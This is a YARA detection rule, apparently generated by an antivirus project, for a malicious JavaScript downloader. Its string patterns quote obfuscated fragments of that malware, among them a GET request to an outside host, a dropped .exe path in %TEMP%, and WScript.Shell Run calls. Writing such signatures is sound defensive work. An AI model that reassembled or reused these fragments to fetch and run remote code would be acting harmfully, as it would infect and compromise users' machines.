rule sig_20160328_1cee90902f3f33d9f9ac93fb7e157f3b {
  meta:
    description = "datamaliciousorder - file 20160328_1cee90902f3f33d9f9ac93fb7e157f3b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "daad0671b573a13f7886c14eb831b1d4d0c6becb523e91bfadb26904fae3ba43"

  strings:
    $s1  = "function Foyswtlr() {return Jvejjuer[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"GggVjtQCkDti.exe\";};" fullword ascii
    $s2  = "Ohtiue[Uboatwltb](\"GET\", \"http://purelaces.com/ny6sja\", false);" fullword ascii
    $s3  = "do {WScript[Tafxzqck](Hfygoexbuf() * 11)} while (Ohtiue[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Cpeqjwihfz(Yjqxanrgq, Npszafkdm){return Yjqxanrgq - Npszafkdm;};" fullword ascii
    $s5  = "var Jvejjuer = function Jalirue() {return WScript[Xgarfske](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Dhbgzksf(Qhlczi){Jvejjuer[\"Run\"](Qhlczi, Eintzfmuz, Eintzfmuz);};" fullword ascii
    $s7  = "function Sfpfuuhb() {return ((Dljagu == true) && (Dljagu == Npzebzu)) ? 1 : Eintzfmuz;};" fullword ascii
    $s8  = "var Smwfoesis = new this[\"Date\"]();" fullword ascii
    $s9  = "var Npzebzu = false;" fullword ascii
    $s10 = "function Wlbba(){return Flbopnmx;};" fullword ascii
    $s11 = "var Hbxvntfz = false;" fullword ascii
    $s12 = "var Dljagu = false;" fullword ascii
    $s13 = "function Gknyn(){return Xgarfske;};" fullword ascii
    $s14 = "Npzebzu = true; " fullword ascii
    $s15 = "function Hfygoexbuf(){return 22;};" fullword ascii
    $s16 = " while (Ktpdauok){" fullword ascii
    $s17 = "return Cpeqjwihfz(Cqgpys, Vlsscvo);" fullword ascii
    $s18 = "function Saygkaftt()" fullword ascii
    $s19 = "function Osxvyhy(Yzzkun) {var Ztdqia = (1, 2, 3, 4, 5, Yzzkun); return Ztdqia;};" fullword ascii
    $s20 = "Dljagu = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}